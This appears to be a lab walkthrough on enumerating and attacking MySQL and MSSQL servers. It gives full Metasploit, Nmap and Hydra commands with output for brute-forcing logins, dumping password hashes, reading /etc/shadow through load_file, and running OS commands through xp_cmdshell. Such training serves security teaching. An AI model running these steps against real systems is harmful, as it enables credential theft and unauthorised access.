# MySQL

Now we will enumerate MySQL database.

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 07:53 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000047s latency).

PORT     STATE SERVICE VERSION
<strong>3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
</strong>MAC Address: 02:42:C0:15:A1:03 (Unknown)
</code></pre>

Let's see if we can log in to MySQL as root:

```sh
root@attackdefense:~# mysql -h 192.21.161.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

it looks like we logged in.

To show databases, we can use the following command:

```sh
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+
11 rows in set (0.001 sec)
```

To select a database, we can use the following command:

```sh
MySQL [(none)]> use books
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [books]> 
```

To count the number of authors in the books database, we can use the following command:

```sh
MySQL [books]> select count(*) from authors;
+----------+
| count(*) |
+----------+
|       10 |
+----------+
1 row in set (0.001 sec)
```

To see everything in the database, we can use the following command:

```sh
MySQL [books]> select * from authors;
+----+------------+-----------+-----------------------------+------------+---------------------+
| id | first_name | last_name | email                       | birthdate  | added               |
+----+------------+-----------+-----------------------------+------------+---------------------+
|  1 | Gregoria   | Lowe      | gutmann.rebekah@example.net | 1982-03-09 | 1983-01-11 11:25:43 |
|  2 | Ona        | Anderson  | ethelyn02@example.net       | 1980-06-02 | 1972-05-05 07:26:52 |
|  3 | Emile      | Lakin     | rippin.freda@example.com    | 1979-04-06 | 2010-05-30 20:03:07 |
|  4 | Raul       | Barton    | mschiller@example.com       | 1976-05-06 | 1979-02-08 12:32:29 |
|  5 | Sofia      | Collier   | rodrigo34@example.net       | 1978-06-09 | 1991-05-01 10:02:54 |
|  6 | Wellington | Fay       | jared98@example.com         | 2011-08-11 | 1992-05-27 23:20:20 |
|  7 | Garnet     | Braun     | hickle.howell@example.net   | 1990-04-27 | 2010-04-13 09:48:36 |
|  8 | Alessia    | Kuphal    | skiles.reggie@example.net   | 1978-04-06 | 2014-08-22 21:23:00 |
|  9 | Deven      | Carroll   | savanah.zulauf@example.net  | 2007-02-15 | 1998-02-16 11:45:32 |
| 10 | Issac      | Stanton   | ozella10@example.net        | 2013-10-13 | 1976-12-09 13:18:45 |
+----+------------+-----------+-----------------------------+------------+---------------------+
10 rows in set (0.000 sec)
```

We can also use Metasploit for MySQL enumeration:

To check which directories are writeable, we can use the following scanner:

<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
dir_list => /usr/share/metasploit-framework/data/wordlists/directory.txt
<strong>msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > <a data-footnote-ref href="#user-content-fn-1">setg</a> rhosts 192.21.161.3
</strong>rhosts => 192.21.161.3
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set verbose false
verbose => false
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set password ""
password => 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > run

[!] 192.21.161.3:3306     - For every writable directory found, a file called mhainVFF with the text test will be written to the directory.
[*] 192.21.161.3:3306     - Login...
[*] 192.21.161.3:3306     - Checking /tmp...
[+] 192.21.161.3:3306     - /tmp is writeable
[*] 192.21.161.3:3306     - Checking /etc/passwd...
[!] 192.21.161.3:3306     - Can't create/write to file '/etc/passwd/mhainVFF' (Errcode: 20)
[*] 192.21.161.3:3306     - Checking /etc/shadow...
[!] 192.21.161.3:3306     - Can't create/write to file '/etc/shadow/mhainVFF' (Errcode: 20)
[*] 192.21.161.3:3306     - Checking /root...
[+] 192.21.161.3:3306     - /root is writeable
.
.
</code></pre>

**setg** is used to declare the rhosts as global so that we don't have to specify it repeatedly in a single session.

Another scanner that we can use is hashdump:

```sh
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_hashdump 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set password ""
password => 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.21.161.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.21.161.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.21.161.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.21.161.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.21.161.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.21.161.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Here we got a bunch of hashes of different users.

Let's again jump into MySQL and see if we have some access to internal sensitive files:

```sh
MySQL [(none)]> select load_file("/etc/shadow");
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file("/etc/shadow")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
daemon:*:17850:0:99999:7:::
bin:*:17850:0:99999:7:::
sys:*:17850:0:99999:7:::
sync:*:17850:0:99999:7:::
games:*:17850:0:99999:7:::
man:*:17850:0:99999:7:::
lp:*:17850:0:99999:7:::
mail:*:17850:0:99999:7:::
news:*:17850:0:99999:7:::
uucp:*:17850:0:99999:7:::
proxy:*:17850:0:99999:7:::
www-data:*:17850:0:99999:7:::
backup:*:17850:0:99999:7:::
list:*:17850:0:99999:7:::
irc:*:17850:0:99999:7:::
gnats:*:17850:0:99999:7:::
nobody:*:17850:0:99999:7:::
libuuid:!:17850:0:99999:7:::
syslog:*:17850:0:99999:7:::
mysql:!:17857:0:99999:7:::
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7:::
```

Let's now try Nmap.

To check if there is any other user with an empty password rather than root, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-empty-password
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:26 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To get more info about the database using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-info          
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:27 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000039s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 52
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, Support41Auth, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: xI@G$z_L?5,zD$(;/w0$
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for users using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-users --script-args="mysqluser='root',mysqlpass=''";
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:32 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for databases using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''";
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:37 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000075s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for MySQL variables, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:39 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-variables: 
|   auto_increment_increment: 1
|   auto_increment_offset: 1
|   autocommit: ON
|   automatic_sp_privileges: ON
|   back_log: 50
|   basedir: /usr
|   big_tables: OFF
|   binlog_cache_size: 32768
|   binlog_direct_non_transactional_updates: OFF
|   binlog_format: STATEMENT
|   binlog_stmt_cache_size: 32768
|   bulk_insert_buffer_size: 8388608
|   character_set_client: latin1
|   character_set_connection: latin1
|   character_set_database: latin1
|   character_set_filesystem: binary
|   character_set_results: latin1
|   character_set_server: latin1
|   character_set_system: utf8
|   character_sets_dir: /usr/share/mysql/charsets/
.
.
```

To audit the MySQL database, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:48 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
```

To dump the hashes using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-dump-hashes --script-args="username='root',password=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:52 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000038s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

We can also use Nmap to run a query:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:56 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000041s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-query: 
|   count(*)
|   10
|   
|   Query: select count(*) from books.authors;
|_  User: root
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

***

## MySQL Dictionary Attack

To brute force the login credentials, we can use the msfconsole:

<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/mysql/mysql_login 
msf5 auxiliary(scanner/mysql/mysql_login) > set rhosts 192.28.228.3
rhosts => 192.28.228.3
msf5 auxiliary(scanner/mysql/mysql_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set verbose false
verbose => false
msf5 auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
stop_on_success => true
msf5 auxiliary(scanner/mysql/mysql_login) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_login) > run

<strong>[+] 192.28.228.3:3306     - 192.28.228.3:3306 - Success: 'root:catalina'
</strong>[*] 192.28.228.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

Here we got the password for root.

We can do the same thing using Hydra:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.28.228.3 mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-29 09:27:55
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.28.228.3:3306/
<strong>[3306][mysql] host: 192.28.228.3   login: root   password: catalina
</strong>1 of 1 target successfully completed, 1 valid password found
</code></pre>

## MSSQL Nmap Scripts

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:21 IST
Nmap scan report for 10.5.29.39
Host is up (0.0016s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000
```

To get the info about the database, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-info
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:22 IST
Nmap scan report for 10.5.29.39
Host is up (0.0017s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM

Host script results:
| ms-sql-info: 
|   10.5.29.39:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

To get ntlm info, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-ntlm-info --script-args mssql.instance-port=1433
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:25 IST
Nmap scan report for 10.5.29.39
Host is up (0.0017s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393
```

To run Bruteforce attack, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:28 IST
Nmap scan report for 10.5.29.39
Host is up (0.0016s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-brute: 
|   [10.5.29.39:1433]
|     Credentials found:
|       auditor:jasmine1 => Login Success
|       dbadmin:bubbles1 => Login Success
|_      admin:anamaria => Login Success
```

To look for users with empty passwords, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-empty-password                                            
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:30 IST
Nmap scan report for 10.5.29.39
Host is up (0.0018s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-empty-password: 
|   [10.5.29.39:1433]
|_    sa:<empty> => Login Success
```

To run the query using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:35 IST
Nmap scan report for 10.5.29.39
Host is up (0.0016s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-query: 
|   [10.5.29.39:1433]
|     Query: SELECT * FROM master..syslogins
|       sid	status	createdate	updatedate	accdate	totcpu	totio	spacelimit	timelimit	resultlimit	name	dbname	password	language	denylogin	hasaccess	isntname	isntgroup	isntuser	sysadmin	securityadmin	serveradmin	setupadmin	processadmin	diskadmin	dbcreator	bulkadmin	loginname
|       ===	======	==========	==========	=======	======	=====	==========	=========	===========	====	======	========	========	=========	=========	========	=========	========	========	=============	===========	==========	============	=========	=========	=========	=========
|       0x01	9	2003-04-08T03:40:35	2021-01-21T04:50:57	2003-04-08T03:40:35	0	0	0	0	0sa	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	00	sa
|       0x0106000000000009010000001e501960278b270fd34191426bf0193fc0b4e786	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLResourceSigningCertificate##	master	NullNull	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLResourceSigningCertificate##
|       0x010600000000000901000000ed1b6318a0592d96ce6d143a9184be0f758287be	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##	master	NullNull	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##
|       0x010600000000000901000000fb236d83a8dc8e7de549c56382c1a25f85ea3704	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##	master	NullNull	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##
|       0x010600000000000901000000bb1b6130e13e5b67b7bd49ce40730a5b67188088	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_PolicySigningCertificate##	master	Null	Null00	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicySigningCertificate##
|       0x010600000000000901000000dcfdce5b748d5515e793fc84e1eccbe22a187f7a	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##	master	NullNull	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##
|       0x5681cce7a1f1ff41b2f95ced7d792e70	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	00	0	0	0	##MS_PolicyEventProcessingLogin##	master	Null	us_english	0	1	0	00	0	0	0	0	0	0	0	0	##MS_PolicyEventProcessingLogin##
|       0x27578d8516843e4094efa2ceed085c82	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	00	0	0	0	##MS_PolicyTsqlExecutionLogin##	master	Null	us_english	0	1	0	0	00	0	0	0	0	0	0	0	##MS_PolicyTsqlExecutionLogin##
|       0x0106000000000009010000004c1967c27feb2ead332894c5a0779eae202847c8	9	2019-09-24T08:51:58	2019-09-24T08:51:58	2019-09-24T08:51:58	0	0	0	0	0	##MS_AgentSigningCertificate##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_AgentSigningCertificate##
|       0x010500000000000515000000cf4b5eb619bca0ed968e21eff4010000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator	master	Null	us_english	01	1	0	1	1	0	0	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator
|       0x010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\SQLWriter	master	Null	us_english	01	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\SQLWriter
|       0x0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\Winmgmt	master	Null	us_english	01	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\Winmgmt
|       0x010600000000000550000000703344e71d40b7ffb8844562a9e3c7d4fd9771d8	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS
|       0x01020000000000052000000021020000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	00	0	0	0	BUILTIN\Users	master	Null	us_english	0	1	1	1	0	0	00	0	0	0	0	0	BUILTIN\Users
|       0x010100000000000512000000	9	2021-01-20T01:47:08	2021-01-20T02:50:35	2021-01-20T01:47:08	0	00	0	0	NT AUTHORITY\SYSTEM	master	Null	us_english	0	1	1	0	1	1	00	0	0	0	0	0	NT AUTHORITY\SYSTEM
|       0x0106000000000005500000002c4559766def9a2f8e23ea83ae7c7f71254cb2cc	9	2021-01-20T01:47:09	2021-01-20T01:47:09	2021-01-20T01:47:09	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS	master	Nullus_english	0	1	1	0	1	0	0	0	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
|       0x4a84b80919150844b881d1c2fead7f03	9	2021-01-20T02:48:23	2021-01-20T02:48:23	2021-01-20T02:48:23	00	0	0	0	admin	master	Null	us_english	0	1	0	0	0	1	0	00	0	0	0	0	admin
|       0xc923586600ca1d40a00bcea3f83cf029	9	2021-01-20T02:50:33	2021-01-20T02:50:36	2021-01-20T02:50:33	00	0	0	0	Mssql	master	Null	us_english	0	1	0	0	0	1	0	00	0	0	0	0	Mssql
|       0xdab05f73c5a136409081bc4dd4bb1173	9	2021-01-20T03:01:26	2021-01-20T03:15:57	2021-01-20T03:01:26	00	0	0	0	Mssqla	master	Null	us_english	0	1	0	0	0	1	0	00	0	0	0	0	Mssqla
|       0x09f200d8751d4040b72ae7bd09a43fe0	9	2021-01-20T03:31:14	2021-01-20T03:31:14	2021-01-20T03:31:14	00	0	0	0	auditor	master	Null	us_english	0	1	0	0	0	0	0	00	0	0	0	0	auditor
|_      0x1f80eace64083c4598d9fc5c34060c84	9	2021-01-20T03:31:47	2021-01-20T03:31:47	2021-01-20T03:31:47	00	0	0	0	dbadmin	master	Null	us_english	0	1	0	0	0	0	0	00	0	0	0	0	dbadmin
```

To dump the hashes, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:38 IST
Nmap scan report for 10.5.29.39
Host is up (0.0018s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-dump-hashes: 
| [10.5.29.39:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b
```

To run a command, we can use the following command:

```sh
root@attackdefense:~# nmap 10.5.29.39 -p 1433 -sV --script=ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 15:41 IST
Nmap scan report for 10.5.29.39
Host is up (0.0017s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-xp-cmdshell: 
|   [10.5.29.39:1433]
|     Command: ipconfig
